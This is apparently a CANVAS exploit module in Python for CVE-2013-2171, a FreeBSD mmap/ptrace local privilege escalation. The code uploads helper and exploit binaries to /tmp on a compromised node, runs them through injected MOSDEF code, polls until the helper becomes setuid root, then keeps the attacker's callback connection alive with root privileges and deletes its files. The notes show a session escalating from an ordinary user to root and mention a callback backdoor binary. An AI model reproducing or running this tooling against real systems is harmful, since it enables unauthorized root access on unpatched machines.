#!/usr/bin/env python


import sys
import time

from exploitutils import *
from canvaserror import *
from ExploitTypes.localexploit import LocalExploit

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'maptrace: MMAP/PTRACE privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Intel,FreeBSD'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2013-2171'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2171'
DOCUMENTATION['References']    = 'http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['FreeBSD']]

DOCUMENTATION['Notes']         = """
Tested on FreeBSD 9.0-RC3 and FreeBSD 9.0-RELEASE* AMD64

To test this exploit from CANVAS use the ./backdoors/mosdef_callbacks/mosdef_callback_fbsd9_i386
callback binary to establish a BSD node on a universal CANVAS listener. Then run the maptrace
module against this node to elevate your privileges on the node. This should work on FreeBSD
9.0-RELEASE* amd64 on 64bit Intel processors. Note this will not spawn a new node, but rather
keep the existing node connection with elevated privileges.

Alternatively you can use the Resources/x binary outside of the framework. 

$ uname -a
FreeBSD freebsd90 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
$ id
uid=1001(immunity) gid=1001(immunity) groups=1001(immunity)
$ ./x
[***] FeeBSD amd64 local r00t - MMAP/PTRACE [***]
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
#

"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.node = None
        self.lh = 'exploits/maptrace/Resources/h'
        self.lx = 'exploits/maptrace/Resources/x'
        self.dh = '/tmp/h' # remote path helper
        self.dx = '/tmp/x' # remote path exploit

    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename = dst)
        except NodeCommandError, i:
            self.log('[x] failed to upload %s to %s: %s' % (src, dst, str(i)))
            return False

        self.log('[+] upload succeeded ...')
        return True

    def statFile(self, path):
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            self.log('[x] could not open %s ...' % path)
            return {}
        ret,stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            self.log('[+] st_mode: %x' % stat['st_mode'])
            self.log('[+] st_uid: %x' % stat['st_uid'])
            return stat
        else:
            self.log('[x] fstat failed ...')
            return {}

    def cleanup(self):
        self.log('[+] Cleaning up: delete %s and %s' % (self.dh, self.dx))
        self.node.runcommand('rm -rf %s %s' % (self.dx, self.dh))

    def execveHelper(self, wait = 0):
        lvars = {}
        lvars['ENV_XP'] = 'ENV_XP=%s' % self.dx
        lvars['HELPER'] = self.dh
        lvars['MOSDEF'] = '%d' % self.node.shell.fd
        lvars['WAIT'] = wait

        code = """
        #import "string", "ENV_XP" as "ENV_XP"
        #import "string", "HELPER" as "HELPER"
        #import "string", "MOSDEF" as "MOSDEF"
    
        #import "int", "WAIT" as "WAIT"

        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            char *argv[3];
            char *env[2];
            int pid;

            argv[0] = HELPER;
            argv[1] = MOSDEF;
            argv[2] = NULL;
        
            env[0] = ENV_XP;
            env[1] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, env);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """
        ret = self.node.shell.runCode(code, lvars)
        self.log('[+] execve helper ret: %d ...' % ret)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]
        
        if 'bsd' not in self.node.capabilities:
            self.log('[x] not a FreeBSD node ...')
            return False

        stat = self.statFile(self.dh)
        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
            self.log('[+] already compromised ... initing elevated MOSDEF loop')
            self.execveHelper(wait = 1)
            return True

        self.log('[+] uploading helper and exploit ...')
        if self.nodeUpload(self.lx, self.dx) == False:
            return False
        if self.nodeUpload(self.lh, self.dh) == False:
            return False

        self.log('[+] executing helper ...')
        self.execveHelper()

        i = 30
        while i:
            self.log('[+] checking helper mode ...')
            stat = self.statFile(self.dh)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                self.log('[+] compromised ... initing elevated MOSDEF loop')
                self.execveHelper(wait = 1)
                self.cleanup()
                break
            i -= 1
            time.sleep(1)
        if not i:
            self.log('[+] looks like we failed, try again!')
            self.cleanup()
            return False
        
        return True
